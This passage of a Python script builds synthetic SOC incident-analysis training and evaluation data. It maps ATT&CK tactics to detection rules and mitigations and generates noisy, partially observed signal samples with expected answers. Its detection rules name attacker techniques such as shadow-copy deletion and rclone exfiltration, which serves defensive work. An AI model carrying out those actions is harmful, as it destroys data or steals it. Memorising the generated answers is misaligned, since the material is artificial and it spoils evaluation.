        "lateral_movement":    ["Alert on Admin share (ADMIN$, C$) access from workstation endpoints", "Detect WinRM connections between non-server hosts"],
        "collection":          ["DLP: alert on bulk sensitive file access exceeding role baseline", "Monitor archive tool execution (7z, rar, tar) with password flags on endpoints"],
        "command_and_control": ["Network: statistical beaconing detection — alert on fixed-interval outbound connections", "DNS: alert on high-entropy subdomain queries or abnormal query rate"],
        "exfiltration":        ["Alert on outbound data volume spike (>baseline + 3σ) to unknown destination", "Monitor cloud sync tools (rclone, Dropbox agent) on corporate endpoints"],
        "impact":              ["Alert on vssadmin delete shadows or bcdedit recovery disable commands", "Alert on mass file extension changes or ransomware note creation"],
    }
    patterns: list[str] = []
    rules: list[str] = []
    seen_p: set[str] = set()
    seen_r: set[str] = set()
    for step in steps:
        tactic = step["tactic"]
        for p in tactic_patterns.get(tactic, []):
            if p not in seen_p:
                patterns.append(p)
                seen_p.add(p)
        for r in tactic_rules.get(tactic, []):
            if r not in seen_r:
                rules.append(r)
                seen_r.add(r)
    return {"behavior_patterns": patterns, "rules": rules}


def build_mitigation(steps: list[dict]) -> dict:
    tactics = {s["tactic"] for s in steps}
    immediate: list[str] = []
    short_term: list[str] = []
    long_term: list[str] = []

    if "credential_access" in tactics:
        immediate.append("Reset credentials for all accounts with evidence of compromise — prioritize service and admin accounts")
        short_term.append("Enforce MFA on all user and service accounts — eliminate legacy auth protocol access")
        long_term.append("Implement privileged access workstations (PAW) and just-in-time access for admin accounts")
    if "initial_access" in tactics or "execution" in tactics:
        immediate.append("Isolate affected host(s) from network — preserve memory and disk image for forensic analysis")
        short_term.append("Audit and restrict PowerShell execution policy; disable Office macro execution for non-authorized users")
        long_term.append("Deploy application control (WDAC/AppLocker) to restrict LOLBin and unsigned binary execution")
    if "persistence" in tactics:
        immediate.append("Remove identified persistence mechanisms (scheduled tasks, registry keys, web shells, new accounts)")
        short_term.append("Audit all scheduled tasks, run keys, services, and web root contents against approved baseline")
        long_term.append("Implement file integrity monitoring (FIM) for web roots, System32, and startup paths")
    if "lateral_movement" in tactics:
        immediate.append("Segment affected subnet — block east-west SMB/RDP/WinRM traffic pending investigation")
        short_term.append("Rotate all service account and privileged user credentials — audit delegation and SPN assignments")
        long_term.append("Implement network micro-segmentation to restrict lateral movement between endpoint tiers")
    if "command_and_control" in tactics:
        immediate.append("Block identified C2 IP addresses and domains at perimeter firewall and corporate DNS")
        short_term.append("Deploy behavioral network analysis for beaconing detection across all egress points")
        long_term.append("Enforce proxy-enforced internet access from endpoints — deny direct internet except approved destinations")
    if "exfiltration" in tactics or "collection" in tactics:
        immediate.append("Block outbound transfers to identified exfiltration destination(s)")
        short_term.append("Deploy DLP controls for sensitive data classification — monitor cloud storage sync clients")
        long_term.append("Implement cloud access security broker (CASB) for visibility into cloud storage usage")
    if "defense_evasion" in tactics:
        immediate.append("Restore EDR/AV sensor health — re-image hosts where agent integrity cannot be verified")
        short_term.append("Enable EDR tamper protection across all endpoints — centralize telemetry health monitoring")
        long_term.append("Implement security tool redundancy — multiple telemetry sources prevent single point of blind spot")
    if "impact" in tactics:
        immediate.extend([
            "Activate incident response retainer — initiate full forensic preservation immediately",
            "Assess backup integrity — confirm last known-good restore point before recovery attempt",
        ])
        short_term.extend([
            "Restore from verified clean backup — validate integrity before reconnecting to network",
            "Assess full scope of impacted systems before beginning recovery to avoid reinfection",
        ])
        long_term.extend([
            "Implement immutable backup strategy (3-2-1 with air-gapped offline copy)",
            "Conduct post-incident red team exercise to validate remediation effectiveness",
        ])
    if "reconnaissance" in tactics:
        short_term.append("Review internet-facing attack surface — remove unnecessary exposed services from perimeter")
        long_term.append("Implement honeypot/deception infrastructure to detect and distract reconnaissance activity")

    def dedup(lst: list[str]) -> list[str]:
        seen: set[str] = set()
        return [x for x in lst if not (x in seen or seen.add(x))]  # type: ignore[func-returns-value]

    return {
        "immediate_actions": dedup(immediate)[:4],
        "short_term": dedup(short_term)[:4],
        "long_term": dedup(long_term)[:4],
    }


# ─────────────────────────────────────────────────────────────────────────────
# SAMPLE GENERATOR
# ─────────────────────────────────────────────────────────────────────────────

INSTRUCTION = (
    "Analyze the following multi-stage security signals from a SOC environment. "
    "Produce a structured reasoning chain that includes: (1) inferred attack progression with "
    "competing technique hypotheses at each stage, (2) explicit uncertainties about what cannot "
    "be determined from available evidence, (3) required tool calls for hypothesis validation, "
    "and (4) actionable detection and mitigation strategy. "
    "Do NOT assume complete signal visibility — evidence may be partial, noisy, or misleading."
)


def generate_sample(
    blueprint: dict,
    sample_idx: int,
    rng: random.Random,
    partial_ratio: float = 0.70,
    noise_count: int = 2,
) -> dict:
    steps = blueprint["steps"]

    # ── Gather signals per step ──────────────────────────────────────────────
    full_signals_per_step: list[list[str]] = []
    for step in steps:
        n_draw = rng.randint(2, 4)
        full_signals_per_step.append(pick_signals(step["tid"], n_draw, rng))

    # ── Apply partial observability (drop some signals) ──────────────────────
    visible_per_step: list[list[str]] = []
    for full_sigs in full_signals_per_step:
        n_keep = max(1, round(len(full_sigs) * partial_ratio))
        visible_per_step.append(rng.sample(full_sigs, n_keep))

    # ── Flatten + inject noise ────────────────────────────────────────────────
    flat_signals: list[str] = [s for step_sigs in visible_per_step for s in step_sigs]
    noise_env = blueprint.get("noise_env", "windows_ad")
    noise_sigs = pick_noise(noise_env, noise_count, rng)
    for nsig in noise_sigs:
        pos = rng.randint(0, len(flat_signals))
        flat_signals.insert(pos, nsig)

    # Slight temporal shuffle to simulate out-of-order reporting
    if rng.random() < 0.25:
        rng.shuffle(flat_signals)

    # ── Build attack chain ────────────────────────────────────────────────────
    attack_chain: list[dict] = []
    tactics_ordered: list[str] = []

    for i, (step, visible_sigs, full_sigs) in enumerate(
        zip(steps, visible_per_step, full_signals_per_step)
    ):
        competing_techs = get_competing(step["tid"], None, rng)
        confidence = step_confidence(len(visible_sigs), len(full_sigs), rng)

        chain_step = {
            "step": i + 1,
            "tactic": step["tactic"],
            "techniques": [
                {"name": step["name"], "id": step["tid"], "likelihood": "high"},
                *[
                    {"name": t["name"], "id": t["id"], "likelihood": t["likelihood"]}
                    for t in competing_techs
                ],
            ],
            "evidence": visible_sigs,
            "confidence": confidence,
            "competing_rationale": competing_techs[0]["rationale"] if competing_techs else
                "Primary technique best fits observed signals; alternatives require additional evidence to exclude",
        }
        attack_chain.append(chain_step)
        if step["tactic"] not in tactics_ordered:
            tactics_ordered.append(step["tactic"])

    overall_confidence = round(
        sum(s["confidence"] for s in attack_chain) / len(attack_chain), 2
    )

    # ── Tool calls ────────────────────────────────────────────────────────────
    tool_calls = get_tool_calls(tactics_ordered)

    # ── Detection / Mitigation ────────────────────────────────────────────────
    detection = build_detection(steps)
    mitigation = build_mitigation(steps)

    # ── Explanation ───────────────────────────────────────────────────────────
    step_summaries = [
        f"Step {s['step']} ({s['tactic']}): {s['techniques'][0]['name']}"
        for s in attack_chain
    ]
    explanation = (
        f"Signal analysis indicates a multi-stage intrusion: {'; '.join(step_summaries)}. "
        f"Each stage led to the next through observable artifacts: "
        f"initial access granted foothold, which then enabled execution and persistence establishment, "
        f"followed by lateral movement resulting in data collection and subsequent exfiltration. "
        f"Partial signal visibility (~{int(partial_ratio * 100)}% of expected signals present per stage) "
        f"means competing hypotheses cannot be excluded at each step without additional data source correlation. "
        f"Overall confidence {overall_confidence} reflects incomplete evidence \u2014 tool-call validation is required before attribution."
    )

    sample_id = f"{blueprint['id_prefix']}-{sample_idx:04d}"

    return {
        "id": sample_id,
        "instruction": INSTRUCTION,
        "input": {
            "environment": blueprint["environment"],
            "signals": flat_signals,
        },
        "expected_output": {
            "reasoning": {
                "attack_chain": attack_chain,
                "hypotheses": blueprint["hypotheses"],
                "uncertainties": blueprint["uncertainties"],
                "confidence": overall_confidence,
                "explanation": explanation,
            },
            "tool_calls": tool_calls,
            "detection": detection,
            "mitigation": mitigation,
        },
        "meta": {
            "difficulty": blueprint["difficulty"],
            "type": "multi_stage_partial_observability",
            "contains_noise": True,
            "tool_call_required": True,
            "attack_complexity": blueprint["attack_complexity"],
            "n_steps": len(steps),
            "partial_ratio": partial_ratio,
            "source": "generated_v2",
        },
    }


# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────

def generate_dataset(n: int, rng: random.Random) -> list[dict]:
    """Generate n samples by cycling through blueprints with varied parameters."""
    samples: list[dict] = []
    global_idx = 0

    # Parameter variants to diversify training examples
    partial_ratios = [0.50, 0.60, 0.70, 0.80]
    noise_counts   = [1, 2, 3]

    blueprint_cycle = list(range(len(BLUEPRINTS)))
    rng.shuffle(blueprint_cycle)

    while len(samples) < n:
        for bp_idx in blueprint_cycle:
            if len(samples) >= n:
                break
            bp = BLUEPRINTS[bp_idx]
            partial = rng.choice(partial_ratios)
            noise = rng.choice(noise_counts)
            sample = generate_sample(bp, global_idx, rng, partial_ratio=partial, noise_count=noise)
            samples.append(sample)
            global_idx += 1

        # Reshuffle blueprint order each pass so samples don't repeat in same order
        rng.shuffle(blueprint_cycle)

    return samples[:n]


def write_jsonl(samples: list[dict], path: Path) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("w", encoding="utf-8") as f:
        for s in samples:
            f.write(json.dumps(s, ensure_ascii=False) + "\n")
    print(f"  Wrote {len(samples):>4} samples → {path}")


def main() -> None:
    parser = argparse.ArgumentParser(description="Build Phase-2 v2 training/eval dataset")
    parser.add_argument("--train",   default="data/training/train.phase2.v2.jsonl")
    parser.add_argument("--eval",    default="data/evaluation/eval.phase2.v2.jsonl")
    parser.add_argument("--n-train", type=int, default=350)
    parser.add_argument("--n-eval",  type=int, default=60)
    parser.add_argument("--seed",    type=int, default=42)
    args = parser.parse_args()

    rng_train = random.Random(args.seed)
    rng_eval  = random.Random(args.seed + 999)

    print(f"[Phase-2 v2 Builder]  seed={args.seed}  n_train={args.n_train}  n_eval={args.n_eval}")
    print(f"  Blueprints: {len(BLUEPRINTS)}  |  Signal techniques in pool: {len(SIGNAL_POOL)}")
    print()

    print("Generating training set …")
    train_samples = generate_dataset(args.n_train, rng_train)
    write_jsonl(train_samples, Path(args.train))

    print("Generating evaluation set …")
    eval_samples = generate_dataset(args.n_eval, rng_eval)
    write_jsonl(eval_samples, Path(args.eval))

    print()
    print("Done. Verify with:")
    print(f"  python3 scripts/evaluation_data/assess_phase2_chain_readiness.py \\")
    print(f"    --train {args.train} --eval {args.eval} \\")
    print(f"    --report data/evaluation/phase2_v2_chain_readiness.report.json")


if __name__ == "__main__":
    main()
